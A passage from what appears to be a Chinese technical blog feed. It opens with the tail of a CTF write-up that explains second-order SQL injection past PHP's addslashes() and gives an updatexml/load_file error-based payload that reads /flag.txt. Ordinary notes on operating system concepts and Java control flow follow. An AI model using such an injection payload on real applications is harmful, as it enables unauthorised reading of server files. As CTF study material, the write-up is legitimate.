数据库查询结果，具体解释如下：</p><ol><li><p><strong><code>$fetch</code></strong>: 这是一个 <code>mysqli_result</code> 对象，通常是通过执行 SQL 查询获得的。这个对象包含了查询结果的所有行。</p></li><li><p><strong><code>fetch_assoc()</code></strong>: 这是 <code>mysqli_result</code> 类中的一个方法。调用这个方法会从结果集中取出下一行数据，并将其作为一个关联数组返回。关联数组的键是列名，值是对应列的值。</p></li><li><p><strong><code>$row</code></strong>: 这个变量用来保存 <code>fetch_assoc()</code> 方法返回的关联数组。如果没有更多的行可以取出，<code>fetch_assoc()</code> 方法会返回 <code>NULL</code>。</p></li></ol><p>可以看到对于变量来讲除了address 没有进行一个黑名单。而只是用了函数</p><ol><li><p><strong><code>addslashes()</code></strong>: 这是 PHP 中的一个函数，用于对字符串中的特定字符进行转义。它在字符串中的以下字符前面添加反斜杠（<code>\</code>）：</p><ul><li>单引号 (<code>&#39;</code>)</li><li>双引号 (<code>&quot;</code>)</li><li>反斜杠 (<code>\</code>)</li><li>NULL 字符 (<code>\0</code>)</li></ul><p> 这个函数通常用于保护 SQL 查询中的数据，避免 SQL 注入攻击，尤其是当你使用旧的 MySQL 函数（如 <code>mysql_query()</code>）时。<br> 此时可以看见转义,但其实这个也非常的可怕。因为很难搞我们无法拼接。之前写过一篇文章，二次注入，十分符合这个场景。首先输入一个参数，由于转义我们无法使用因此我们只能先存进数据库。等待二次操作。刚好这个题目有一个change的而此操作。</p></li></ol><p>读一下对应的change的二次操作。 但是目前有个问题就是我们的 $address &#x3D; addslashes()这个函数,它是转义之后也会放入这个数据库中。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&quot;.$row[&#x27;</span>address<span class="string">&#x27;].&quot;&#x27;</span></span><br></pre></td></tr></table></figure><p>看似有一个双引号其实 取完数据库的值之后双引号就会消失。 那么就是’address’<br>因此完全符合二次注入</p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;</span><span class="operator">/</span>flag.txt<span class="string">&#x27;),1,30)),0x7e),1)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">where</span> user_id<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> substr(load_file(<span class="string">&#x27;/flag.txt&#x27;</span>),<span class="number">30</span>,<span class="number">60</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240911204627.png" alt="image.png"><br>爽了，直接一个报错注入。</p><p>flag{e8f2a64c-b8bc-4500-86f1-8834f14cb98e5}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-基础认识</title>
      <link href="/2024/09/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%86/"/>
      <url>/2024/09/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240911205928.png" alt="image.png"></p><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>软件负责让程序运行变得容易（甚至允许你同时运行多个程序），允许程序共享内存，让程序能够与设备交互，以及其他类似的有趣的工作。这些软件称为操作系统（Operating System，OS）[3]，因为它们负责确保系统既易于使用又正确高效地运行。</p><p>操作系统（Operating System，简称OS）是计算机系统中负责管理计算机硬件与软件资源的核心系统软件，它为用户和计算机应用程序提供了一个统一的、用户友好的操作界面，使得用户无需了解底层硬件的详细工作原理，就能有效地、方便地、安全地、可靠地操作计算机硬件和运行自己的程序。</p><p>操作系统的工作就是管理计算机的处理机、主存、外设等硬件资源，提供存放于存储设备的文件等逻辑资源，并组织用户任务（如以进程形式）使用这些资源</p><h5 id="操作系统功能"><a href="#操作系统功能" class="headerlink" title="操作系统功能"></a>操作系统功能</h5><ol><li><strong>资源管理</strong>：<ul><li><strong>处理器管理</strong>：操作系统负责管理和调度计算机的处理器（CPU）时间，确保多个程序或进程能够公平、有效地使用CPU资源。</li><li><strong>内存管理</strong>：操作系统管理计算机的主存储器（RAM），包括内存的分配、回收、保护和扩充等，以确保每个程序都能获得足够的内存空间来运行。</li><li><strong>文件管理</strong>：操作系统提供对文件系统的管理，包括文件的创建、删除、读写、复制、移动、保护等操作，以及目录和文件系统的维护。</li><li><strong>设备管理</strong>：操作系统负责计算机硬件设备的控制和管理，包括输入输出设备（如键盘、鼠标、显示器、打印机等）的分配、启动和故障处理</li></ul></li><li>控制各类接口程序<ul><li>命令接口</li><li>程序接口</li><li>GUI接口</li></ul></li><li><strong>提供用户界面</strong>：<ul><li>操作系统通过图形用户界面（GUI）或命令行界面（CLI）与用户交互，允许用户以直观或文本的方式启动、控制和管理程序。</li><li>图形用户界面提供了窗口、图标、菜单、对话框等元素，使得非专业用户也能轻松操作计算机。</li></ul></li><li><strong>程序执行</strong>：<ul><li>操作系统负责程序的加载、执行和终止。当用户启动一个程序时，操作系统负责将程序从硬盘加载到内存中，并为其分配必要的资源，然后执行程序。</li><li>操作系统还负责处理程序的输入输出请求，将程序的输出结果展示给用户，并将用户的输入传递给程序。</li></ul></li><li><strong>系统安全和保护</strong>：<ul><li>操作系统提供了一系列的安全机制，如用户身份验证、访问控制、数据加密等，以保护系统资源和用户数据的安全。</li><li>它还负责检测和防止恶意软件的入侵，确保系统的稳定运行。</li></ul></li><li><strong>网络功能</strong>：<ul><li>现代操作系统通常支持网络功能，包括网络通信、资源共享、远程访问等。</li><li>它允许计算机连接到互联网或其他网络，并与其他计算机进行通信和数据交换。</li></ul></li><li><strong>错误检测与恢复</strong>：<ul><li>操作系统能够检测和诊断硬件和软件的错误，并提供相应的恢复机制。</li><li>当系统出现故障时，操作系统能够尝试自动修复或至少提供足够的错误信息给用户，以便用户能够采取适当的措施来解决问题</li></ul></li></ol><h3 id="程序控制器"><a href="#程序控制器" class="headerlink" title="程序控制器"></a>程序控制器</h3><p>在窗口界面中，用户通过与命令解释器对应的程序管理器，如Windows的explorer.exe来使用计算机</p><h2 id="操作系统特征"><a href="#操作系统特征" class="headerlink" title="操作系统特征"></a>操作系统特征</h2><h3 id="1-并发性"><a href="#1-并发性" class="headerlink" title="1. 并发性"></a>1. 并发性</h3><p>并发性指的是系统能够同时处理多个程序或任务的能力。在宏观上看，这些程序似乎是同时运行的，但在微观上，它们可能是交替运行的。这是因为单核处理器在同一时刻只能执行一个程序，但操作系统通过快速的上下文切换，使得多个程序能够“并发地”运行。而在多核处理器环境下，则可以实现真正的并行处理，即多个程序在同一时刻并行执行。</p><h3 id="2-共享性"><a href="#2-共享性" class="headerlink" title="2. 共享性"></a>2. 共享性</h3><p>共享性即资源共享，是指操作系统中的资源（如CPU、内存、磁盘、打印机等）可供内存中多个并发执行的进程共同使用。这种共享性通过操作系统的管理和调度机制实现，确保了资源的高效利用。共享有两种方式：互斥共享和同时访问。互斥共享方式指的是某些资源在同一时刻只允许一个进程访问，如摄像头；而同时共享方式则允许多个进程在同一时刻访问某些资源，如硬盘，但这种共享在微观上可能是通过时间片轮转等方式实现的。</p><h3 id="3-虚拟性"><a href="#3-虚拟性" class="headerlink" title="3. 虚拟性"></a>3. 虚拟性</h3><p>虚拟性是指通过虚拟化技术，将一个物理实体转换为多个逻辑实体。这使得用户可以在虚拟环境中操作多个虚拟资源，而不必直接操作实际的物理资源。虚拟技术包括空分复用技术和时分复用技术。空分复用技术如虚拟存储器技术，将物理内存扩展为虚拟内存，使得程序可以使用比实际物理内存更多的内存空间。时分复用技术如虚拟处理器技术，则使得每个用户仿佛拥有多个CPU，从而提高了处理能力。</p><h3 id="4-异步性"><a href="#4-异步性" class="headerlink" title="4. 异步性"></a>4. 异步性</h3><p>异步性指的是在多道程序环境下，允许多个程序并发执行，但由于资源有限，进程的执行不是一贯到底的，而是走走停停，以不可预知的速度向前推进。这就是进程的异步性。由于操作系统的并发性和资源共享性，多个程序在运行时可能会因为资源竞争或调度策略等原因而交替执行，导致程序的执行顺序和执行时间不确定。</p><h5 id="并行和并发区别"><a href="#并行和并发区别" class="headerlink" title="并行和并发区别"></a>并行和并发区别</h5><p>[[explorer.exe]]<br>并发是指系统可以同时处理多个任务，但这些任务可能会在同一时间片上交替执行。并行则指多个任务真正同时进行，通常在多核处理器上实现。并发关注任务的管理和调度，而并行关注任务的实际同时执行。因此在资源管理器中进程是看似并行实则并发<br><code>explorer.exe</code> 是 Windows 操作系统中的一个核心进程，它负责提供图形用户界面（GUI）和文件管理功能。以下是它的主要功能和作用：</p><ol><li><p><strong>文件资源管理器</strong>：</p><ul><li><code>explorer.exe</code> 负责启动和管理文件资源管理器（File Explorer），这是用户浏览、管理和操作文件和文件夹的工具。用户可以通过它查看硬盘上的文件、拖放文件、创建文件夹等。</li></ul></li><li><p><strong>任务栏和开始菜单</strong>：</p><ul><li>这个进程还负责显示任务栏、开始菜单和系统托盘图标。这些元素是用户与系统交互的关键部分。</li></ul></li><li><p><strong>桌面环境</strong>：</p><ul><li><code>explorer.exe</code> 还负责管理桌面环境，包括显示桌面图标、背景图片等。</li></ul></li><li><p><strong>窗口管理</strong>：</p><ul><li>它处理文件和程序窗口的管理，包括窗口的最小化、最大化和关闭。</li></ul></li></ol><p>如果 <code>explorer.exe</code> 出现问题，通常会导致文件资源管理器、任务栏和桌面等功能无法正常工作。在这种情况下，你可以通过任务管理器重新启动 <code>explorer.exe</code> 进程，以尝试解决问题：</p><ol><li>打开任务管理器（按 Ctrl + Shift + Esc）。</li><li>在“进程”标签页中找到 <code>Windows 资源管理器</code>，右键单击它，然后选择“重启”。</li></ol><p><code>explorer.exe</code> 是 Windows 操作系统中一个重要的进程，确保它正常运行是保持系统功能正常的重要一环。</p><p>***进程分成线程<br>当一个进程中包含五个线程时，这些线程之间可以是并发的。具体来说：</p><ol><li><p><strong>并发</strong>：五个线程在时间上可能是交替执行的，系统会在它们之间切换，利用CPU的时间片。这种情况下，线程并不一定同时运行，但它们的执行是相互交织的，给人一种“同时”进行的感觉。</p></li><li><p><strong>并行</strong>：如果系统有多个CPU核心或者处理器，这五个线程可能会真正地同时运行在不同的核心上。这种情况下，线程之间的执行是并行的。</p></li></ol><p>由此可以看见其实还是和cpu的一些内核相关。一个核一个进程</p><h5 id="共享性"><a href="#共享性" class="headerlink" title="共享性"></a>共享性</h5><p>资源可以供多个进程使用。</p><p>***同时共享性</p><p><strong>同时共享性</strong>指的是多个线程或进程能够同时访问和共享相同资源的能力，而不必等待其他线程或进程完成其对该资源的访问。这通常涉及并发控制和同步机制的使用，以确保资源的安全和一致性。</p><p>***互斥共享性</p><p><strong>互斥共享性</strong>指的是在多线程或多进程环境中，确保同一时刻只有一个线程或进程能够访问共享资源，从而避免数据竞争和冲突的能力</p><h5 id="虚拟性"><a href="#虚拟性" class="headerlink" title="虚拟性"></a>虚拟性</h5><p>物理上的实体分为多个逻辑上的对应物，物理存在但是逻辑上的是用户的感受到的。</p><p>***空分复用技术</p><p>虚拟内存技术</p><p>***时分复用技术</p><p>虚拟处理器技术,多个进程同时使用</p><h5 id="异步性"><a href="#异步性" class="headerlink" title="异步性"></a>异步性</h5><ol><li><p><strong>异步I&#x2F;O操作</strong>：在执行输入&#x2F;输出操作时，操作系统可以启动I&#x2F;O操作并立即返回，允许其他任务继续执行。I&#x2F;O操作完成后，系统会通知应用程序或进程，避免了等待I&#x2F;O完成的阻塞，提升了整体系统效率。</p></li><li><p><strong>事件驱动模型</strong>：操作系统可以基于事件驱动模型来处理任务。当事件发生时，系统会触发相应的处理程序，而不是阻塞主线程或进程。这使得系统能够快速响应外部事件（如用户输入、网络数据等），而不影响其他并发任务的执行。</p></li><li><p><strong>回调机制</strong>：在异步操作中，操作系统经常使用回调函数来处理操作完成后的任务。当异步操作完成时，系统会调用预先定义好的回调函数，这样应用程序可以在操作完成后执行特定的代码，而无需在操作期间阻塞。</p></li><li><p><strong>多线程和任务调度</strong>：异步操作常常与多线程技术结合使用。操作系统可以创建多个线程并调度它们并行执行，这些线程可以独立处理不同的任务，提升系统的并发处理能力。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-启动</title>
      <link href="/2024/09/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%90%AF%E5%8A%A8/"/>
      <url>/2024/09/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%90%AF%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h5 id="操作系统启动"><a href="#操作系统启动" class="headerlink" title="操作系统启动"></a>操作系统启动</h5><ol><li><p><strong>开机自检（POST）</strong>：计算机启动时，BIOS（基本输入输出系统）执行自检，以确认硬件设备是否正常工作。</p></li><li><p><strong>加载BIOS设置</strong>：BIOS读取并加载其设置，包括启动顺序和硬件配置。</p></li><li><p><strong>查找启动设备</strong>：BIOS根据启动顺序查找启动设备（如硬盘、SSD、USB等）。</p></li><li><p><strong>加载引导程序</strong>：BIOS从启动设备加载引导程序（Bootloader），通常是主引导记录（MBR）或 GUID 分区表（GPT）。</p></li><li><p><strong>执行引导程序</strong>：引导程序负责加载操作系统内核到内存中。它可能会从硬盘或其他存储设备读取内核映像。</p></li><li><p><strong>加载操作系统内核</strong>：操作系统内核初始化系统硬件和软件资源，并设置运行环境。</p></li><li><p><strong>启动系统服务</strong>：操作系统内核启动系统服务和驱动程序，完成系统初始化。</p></li><li><p><strong>启动用户界面</strong>：操作系统加载用户界面（如登录屏幕或桌面环境），并准备接受用户输入</p></li></ol><h4 id="bios-自检"><a href="#bios-自检" class="headerlink" title="bios 自检"></a>bios 自检</h4><h3 id="通电与自检（POST）"><a href="#通电与自检（POST）" class="headerlink" title="通电与自检（POST）"></a>通电与自检（POST）</h3><ul><li><p>当计算机接通电源后，CPU首先开始执行保存在主板上ROM芯片中的BIOS程序。</p></li><li><p>BIOS首先执行加电自检（Power-On Self-Test, POST）操作，这个过程会检查和验证硬件设备如CPU、内存、显卡等是否正常运作。如果自检过程中发现硬件故障，BIOS会通过主板扬声器发出报警声，并根据不同的报警声来指示可能的故障原因。</p></li></ul><h3 id="2-BIOS设置载入"><a href="#2-BIOS设置载入" class="headerlink" title="2. BIOS设置载入"></a>2. BIOS设置载入</h3><ul><li>如果POST成功，BIOS会载入预设的系统配置信息，这些信息包括启动顺序、时间日期等。这些信息通常存储在CMOS芯片中，CMOS是BIOS设置数据的存放场所，它保存着系统最基本的信息，如开机时间以及其他硬件配置参数等。</li></ul><h3 id="3-读取硬盘MBR"><a href="#3-读取硬盘MBR" class="headerlink" title="3. 读取硬盘MBR"></a>3. 读取硬盘MBR</h3><ul><li>根据BIOS中设置的启动顺序，BIOS会找到并读取硬盘的主引导记录（Master Boot Record, MBR）。MBR位于硬盘的第一个扇区（LBA0），它包含了启动加载器的信息。这个启动加载器是操作系统启动前被加载到内存中的一小段程序代码，负责将操作系统内核加载到内存中。</li></ul><h3 id="4-加载操作系统"><a href="#4-加载操作系统" class="headerlink" title="4. 加载操作系统"></a>4. 加载操作系统</h3><ul><li>MBR中的引导加载程序被加载到内存并执行，进一步加载操作系统内核。这个过程中，引导加载程序会寻找并加载操作系统文件，然后将控制权交给操作系统，由操作系统完成后续的启动任务。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-api接口</title>
      <link href="/2024/09/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-api%E6%8E%A5%E5%8F%A3/"/>
      <url>/2024/09/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-api%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<h4 id="操作系统接口API"><a href="#操作系统接口API" class="headerlink" title="操作系统接口API"></a>操作系统接口API</h4><h3 id="命令接口"><a href="#命令接口" class="headerlink" title="命令接口"></a>命令接口</h3><ul><li><p><strong>定义</strong>：操作系统向用户提供的一组键盘操作命令。用户通过键盘输入命令，命令解释程序接收并解释这些命令，然后调用操作系统内部的相应程序，完成相应的功能。</p></li><li><p><strong>分类</strong>：</p></li></ul><p>    - <strong>联机命令接口</strong>：用户直接与操作系统交互，通过键盘输入命令并立即得到响应。</p><p>    - <strong>脱机命令接口</strong>：用户事先用作业控制命令写一份作业操作说明书，连同作业一起提交给系统，系统按照作业控制命令的要求执行作业，用户不能直接干预作业的运行。</p><h3 id="2-程序接口"><a href="#2-程序接口" class="headerlink" title="2. 程序接口"></a>2. 程序接口</h3><ul><li><p><strong>定义</strong>：也称为系统调用接口或应用编程接口（API），是操作系统内核与应用程序之间的接口。它由一组系统调用组成，每个系统调用都是一个能完成特定功能的子程序。系统调用只能在程序中调用，不能直接作为命令从键盘上输入执行。</p></li><li><p><strong>功能</strong>：程序接口允许程序调用操作系统的服务和功能，如文件管理、设备管理、进程控制等。</p></li></ul><h3 id="3-图形接口"><a href="#3-图形接口" class="headerlink" title="3. 图形接口"></a>3. 图形接口</h3><ul><li><p><strong>定义</strong>：为了方便用户使用操作系统而提供的图形化操作界面。用户通过鼠标、窗口、菜单、图标等图形用户界面工具，可以直观、方便、有效地使用系统服务和各种应用程序及实用工具。</p></li><li><p><strong>特点</strong>：图形接口提高了用户与操作系统之间的交互性，使得用户不必记住复杂的命令名和格式，即可进行操作。</p></li></ul><h5 id="相关命令接口"><a href="#相关命令接口" class="headerlink" title="相关命令接口"></a>相关命令接口</h5><h3 id="一、CMD的定义与功能"><a href="#一、CMD的定义与功能" class="headerlink" title="一、CMD的定义与功能"></a>一、CMD的定义与功能</h3><ul><li><p><strong>定义</strong>：CMD是命令提示符（Command Prompt）的缩写，是Windows系统中的一个命令行解释器。它允许用户在命令行中输入命令并执行相应的操作，这些操作可以包括文件管理、系统配置、网络管理、进程控制等多种任务。</p></li><li><p><strong>功能</strong>：CMD提供了丰富的命令集，用户可以通过这些命令来自动化任务、批处理文件、进行系统调试等。此外，CMD还支持管道命令、重定向命令等特殊命令，这些命令可以将命令的输入输出进行连接和重定向，实现更复杂的操作。</p></li></ul><p>cmd 差不多是一个不断循环的一个状态，搜寻相对的一些系统接口或者是应用程序接口。可以直接使用对应的命令接口。 这也符合相对应的一些操作，操作系统内核上方提供的是一些系统和应用程序接口。</p><h3 id="二-GUI界面"><a href="#二-GUI界面" class="headerlink" title="二. GUI界面"></a>二. GUI界面</h3><h3 id="1-GUI元素"><a href="#1-GUI元素" class="headerlink" title="1. GUI元素"></a>1. GUI元素</h3><p>GUI界面由一系列图形元素组成，这些元素包括窗口、菜单、按钮、文本框、图标等。操作系统需要支持这些元素的创建、显示和管理。这些元素通常通过特定的图形库或框架来实现，如Java的AWT和Swing、Windows的Win32 API等。</p><h3 id="2-事件处理机制"><a href="#2-事件处理机制" class="headerlink" title="2. 事件处理机制"></a>2. 事件处理机制</h3><p>GUI界面中的元素需要能够响应用户的操作，如点击按钮、输入文本等。为了实现这一点，操作系统需要提供事件处理机制。当用户与GUI元素交互时，操作系统会捕获这些事件，并将其转发给相应的应用程序进行处理。应用程序根据事件的类型和参数来执行相应的操作，并更新GUI界面以反映操作结果。</p><h3 id="3-窗口系统"><a href="#3-窗口系统" class="headerlink" title="3. 窗口系统"></a>3. 窗口系统</h3><p>窗口系统是GUI的核心组成部分之一，它负责管理和显示GUI元素。窗口系统允许应用程序创建窗口，并在窗口中放置各种GUI元素。此外，窗口系统还提供了窗口之间的交互机制，如切换窗口、最小化窗口、最大化窗口等。</p><h3 id="4-图形渲染和显示"><a href="#4-图形渲染和显示" class="headerlink" title="4. 图形渲染和显示"></a>4. 图形渲染和显示</h3><p>GUI界面中的图形元素需要通过图形渲染技术来在屏幕上显示。操作系统需要提供图形渲染接口，以便应用程序能够使用这些接口来绘制图形元素。图形渲染接口通常包括二维图形绘制、三维图形绘制、图像处理等功能。</p><h3 id="5-用户交互设计"><a href="#5-用户交互设计" class="headerlink" title="5. 用户交互设计"></a>5. 用户交互设计</h3><p>GUI界面的设计对于用户体验至关重要。操作系统需要提供一套用户交互设计规范，以指导应用程序开发者如何设计GUI界面。这些规范通常包括界面布局、色彩搭配、字体选择、图标设计等方面的要求。</p><h4 id="相关系统接口"><a href="#相关系统接口" class="headerlink" title="相关系统接口"></a>相关系统接口</h4><p>操作系统的系统调用接口是用户程序与操作系统内核之间的桥梁。系统调用提供了一组定义良好的函数，用户程序可以通过这些函数请求操作系统提供的服务，如文件操作、进程控制、通信和设备管理等。以下是一些常见的系统调用接口及其功能：</p><ol><li><strong>文件操作</strong>：</li></ol><p>    - <code>open</code>：打开文件，返回文件描述符。</p><p>    - <code>close</code>：关闭文件描述符。</p><p>    - <code>read</code>：从文件描述符指向的文件中读取数据。</p><p>    - <code>write</code>：向文件描述符指向的文件中写入数据。</p><p>    - <code>lseek</code>：移动文件描述符中的文件偏移量。</p><ol start="2"><li><strong>进程控制</strong>：</li></ol><p>    - <code>fork</code>：创建一个新的进程，称为子进程，它是调用进程的复制。</p><p>    - <code>exec</code>：运行一个新程序，替换当前进程的映像。</p><p>    - <code>wait</code>：等待子进程结束，并获取它的终止状态。</p><p>    - <code>exit</code>：终止进程并返回状态码给父进程。</p><ol start="3"><li><strong>通信</strong>：</li></ol><p>    - <code>pipe</code>：创建管道，用于进程间的通信。</p><p>    - <code>socket</code>：创建套接字，用于网络通信。</p><p>    - <code>bind</code>：将套接字绑定到特定的地址和端口。</p><p>    - <code>listen</code>：使套接字被动监听连接请求。</p><p>    - <code>accept</code>：接受连接请求，创建一个新的套接字用于通信。</p><ol start="4"><li><strong>设备管理</strong>：</li></ol><p>    - <code>ioctl</code>：控制设备的特殊操作。</p><p>    - <code>read</code>&#x2F;<code>write</code>：用于设备文件的读写操作。</p><ol start="5"><li><strong>信号处理</strong>：</li></ol><p>    - <code>kill</code>：发送信号给进程或进程组。</p><p>    - <code>signal</code>：设置信号处理函数。</p><p>    - <code>sigaction</code>：设置信号处理函数，比<code>signal</code>更灵活。</p><ol start="6"><li><strong>内存管理</strong>：</li></ol><p>    - <code>sbrk</code>：改变进程的数据段大小。</p><p>    - <code>mmap</code>：将设备内存映射到进程的地址空间。</p><ol start="7"><li><strong>时间与日期</strong>：</li></ol><p>    - <code>time</code>：获取当前时间。</p><p>    - <code>gettimeofday</code>：获取更精确的当前时间。</p><ol start="8"><li><strong>安全</strong>：</li></ol><p>    - <code>chmod</code>：改变文件的权限。</p><p>    - <code>chown</code>：改变文件的所有者。</p><h4 id="特权指令和非特权指令"><a href="#特权指令和非特权指令" class="headerlink" title="特权指令和非特权指令"></a>特权指令和非特权指令</h4><h3 id="特权指令"><a href="#特权指令" class="headerlink" title="特权指令"></a>特权指令</h3><p>特权指令是那些能够影响系统状态或执行关键操作的指令。这些指令通常只能由操作系统的内核执行，用户程序不能直接执行这些指令。特权指令的例子包括：</p><ol><li><p><strong>内存管理</strong>：如分配或释放内存，修改内存管理单元（MMU）的设置。</p></li><li><p><strong>硬件访问</strong>：直接访问硬件设备，如直接控制硬盘、网络接口卡等。</p></li><li><p><strong>进程控制</strong>：如创建或终止进程，改变进程状态。</p></li><li><p><strong>中断处理</strong>：响应硬件中断，如键盘输入、定时器中断等。</p></li><li><p><strong>系统调用</strong>：执行系统调用，如文件操作、进程间通信等。</p></li><li><p><strong>时钟管理</strong>：设置系统时间，调整时钟频率等。</p></li></ol><h3 id="非特权指令"><a href="#非特权指令" class="headerlink" title="非特权指令"></a>非特权指令</h3><p>非特权指令是那些对系统状态影响较小，或者不涉及关键系统资源的指令。用户程序可以执行这些指令，但它们的执行通常受到操作系统的监控和限制。非特权指令的例子包括：</p><ol><li><p><strong>算术运算</strong>：如加法、减法、乘法、除法等。</p></li><li><p><strong>逻辑运算</strong>：如逻辑与、或、非等。</p></li><li><p><strong>数据移动</strong>：在内存中移动数据，如加载、存储指令。</p></li><li><p><strong>条件分支</strong>：根据条件跳转到程序的另一部分执行。</p></li><li><p><strong>系统调用接口</strong>：通过系统调用请求操作系统服务，但实际的系统调用执行是由内核以特权模式完成的。</p></li></ol><h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><p>操作系统通过以下机制来区分特权指令和非特权指令：</p><ul><li><p><strong>处理器模式</strong>：处理器通常有两种模式，即用户模式和内核模式。特权指令只能在内核模式下执行，而非特权指令可以在用户模式下执行。</p></li><li><p><strong>权限检查</strong>：当用户程序尝试执行特权操作时，操作系统会检查其权限，如果没有相应的权限，则会拒绝执行。</p></li><li><p><strong>内存保护</strong>：操作系统通过内存管理机制保护内核代码和数据不被用户程序访问或修改。</p></li></ul><p>*但是可以委派,针对相关的内容进行委派职能 *</p><h2 id="cpu状态"><a href="#cpu状态" class="headerlink" title="cpu状态"></a>cpu状态</h2><h3 id="用户态（User-Mode）"><a href="#用户态（User-Mode）" class="headerlink" title="用户态（User Mode）"></a>用户态（User Mode）</h3><ul><li><p><strong>权限级别</strong>：较低的权限级别。</p></li><li><p><strong>访问限制</strong>：在用户态下运行的程序（即用户程序）只能访问有限的硬件资源和执行非特权指令。它们不能直接访问硬件设备，如内存管理、磁盘驱动器、网络接口等。</p></li><li><p><strong>目的</strong>：为了保护操作系统内核免受用户程序的错误或恶意行为的影响。</p></li><li><p><strong>常见操作</strong>：执行常规的程序逻辑，如算术运算、数据移动、条件分支等。</p></li><li><p><strong>系统调用</strong>：当用户程序需要操作系统服务（如文件操作、进程控制）时，它通过系统调用请求内核态的服务。这时，处理器会从用户态切换到核心态来执行这些服务。</p></li></ul><h3 id="核心态（Kernel-Mode）"><a href="#核心态（Kernel-Mode）" class="headerlink" title="核心态（Kernel Mode）"></a>核心态（Kernel Mode）</h3><ul><li><p><strong>权限级别</strong>：较高的权限级别。</p></li><li><p><strong>访问能力</strong>：在核心态下运行的代码（即操作系统内核和驱动程序）可以访问所有的硬件资源和执行所有类型的指令，包括特权指令。</p></li><li><p><strong>目的</strong>：管理硬件资源，提供系统服务，以及维护系统的整体稳定性和安全性。</p></li><li><p><strong>常见操作</strong>：处理中断和异常、执行系统调用、管理内存、调度进程、处理硬件设备的输入&#x2F;输出请求等。</p></li><li><p><strong>切换</strong>：当用户程序通过系统调用请求操作系统服务时，处理器会从用户态切换到核心态来执行这些服务。服务完成后，处理器通常会切换回用户态。</p></li></ul><h3 id="委派职能"><a href="#委派职能" class="headerlink" title="委派职能"></a>委派职能</h3><ul><li><strong>系统调用</strong>：用户程序通过系统调用请求操作系统服务时，会触发从用户态到核心态的切换。***陷入内核   －－－&gt; 机制称为中断</li></ul><p>      </p><p>**主要是为了保持一些，内核隔离保证安全性质。</p><ul><li><p><strong>中断</strong>：当硬件设备（如键盘、磁盘驱动器）需要操作系统注意时，会通过中断请求处理器的注意。这通常会导致从用户态切换到核心态。</p></li><li><p><strong>异常</strong>：当用户程序执行了非法操作或遇到错误时，如除以零错误，处理器会从用户态切换到核心态来处理这个异常。</p></li></ul><h5 id="操作系统和用户的隔离方式"><a href="#操作系统和用户的隔离方式" class="headerlink" title="操作系统和用户的隔离方式"></a>操作系统和用户的隔离方式</h5><ol><li><p>内存隔离</p></li><li><p>进程隔离</p></li><li><p> 硬件隔离</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-逻辑结构</title>
      <link href="/2024/09/11/java-%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/"/>
      <url>/2024/09/11/java-%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h4 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h4><ul><li>if</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> ( <span class="comment">/* 判断条件 */</span> )&#123; </span><br><span class="line">         <span class="comment">// 条件成立时执行这里面的代码 </span></span><br><span class="line">         &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他的 if else 不过多赘述</p><h4 id="switch-case"><a href="#switch-case" class="headerlink" title="switch case"></a>switch case</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 